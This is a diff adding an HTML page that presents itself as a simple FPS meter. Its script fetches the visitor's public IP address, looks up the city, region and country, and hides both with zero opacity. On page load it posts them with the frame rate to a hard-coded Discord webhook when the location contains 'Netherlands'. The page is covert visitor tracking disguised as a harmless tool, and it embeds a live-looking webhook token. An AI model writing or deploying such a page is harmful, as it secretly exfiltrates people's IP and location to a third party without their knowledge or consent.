@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FPS Meter</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #282c34;
+            color: white;
+        }
+        .fps {
+            font-size: 2rem;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .ip, .location {
+            font-size: 2rem;
+            font-weight: bold;
+            margin: 10px 0;
+            opacity: 0; /* Makes IP and location transparent */
+            pointer-events: none; /* Prevent interaction with these elements */
+        }
+    </style>
+</head>
+<body>
+    <div class="fps">FPS: <span id="fps">Calculating...</span></div>
+    <div class="ip">IP: <span id="ip">Loading...</span></div>
+    <div class="location">Location: <span id="location">Loading...</span></div>
+
+    <script>
+        let lastFrameTime = performance.now();
+        let frameCount = 0;
+        let fpsDisplay = document.getElementById('fps');
+        let ipAddress = "";
+        let locationData = "";
+        let hasSentToWebhook = false;
+
+        // Function to calculate FPS
+        function calculateFPS() {
+            const now = performance.now();
+            frameCount++;
+
+            if (now - lastFrameTime >= 1000) {
+                fpsDisplay.textContent = frameCount;
+                // Send data to Discord webhook after FPS calculation
+                if (!hasSentToWebhook) {
+                    sendToWebhook(frameCount, ipAddress, locationData);
+                    hasSentToWebhook = true;
+                }
+                frameCount = 0;
+                lastFrameTime = now;
+            }
+
+            requestAnimationFrame(calculateFPS);
+        }
+
+        // Start FPS calculation
+        requestAnimationFrame(calculateFPS);
+
+        // Fetch and display IP address
+        async function fetchIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                ipAddress = data.ip;
+                document.getElementById('ip').textContent = ipAddress;
+                fetchLocation(ipAddress);
+            } catch (error) {
+                document.getElementById('ip').textContent = 'Error fetching IP';
+            }
+        }
+
+        // Start IP fetch
+        fetchIP();
+
+        // Fetch and display location based on IP address
+        async function fetchLocation(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                locationData = `${data.city}, ${data.region}, ${data.country_name}`;
+                document.getElementById('location').textContent = locationData;
+            } catch (error) {
+                document.getElementById('location').textContent = 'Error fetching location';
+            }
+        }
+
+        // Send data to Discord webhook only if the location is "The Netherlands"
+        async function sendToWebhook(fps, ip, location) {
+            try {
+                // Check if the location is in The Netherlands
+                if (location && location.includes('Netherlands')) {
+                    const webhookUrl = "https://discord.com/api/webhooks/1322518060610883625/zAOo8Xupztjokz2dd8LtshETast5aEjHNZoa13Gsw_Jxxd9mxG7QLnRo-_yrucrSdk3j";
+                    const payload = {
+                        content: `FPS: ${fps} IP: ${ip} Location: ${location}`
+                    };
+
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                }
+            } catch (error) {
+                console.error('Error sending data to webhook:', error);
+            }
+        }
+    </script>
+</body>
+</html>
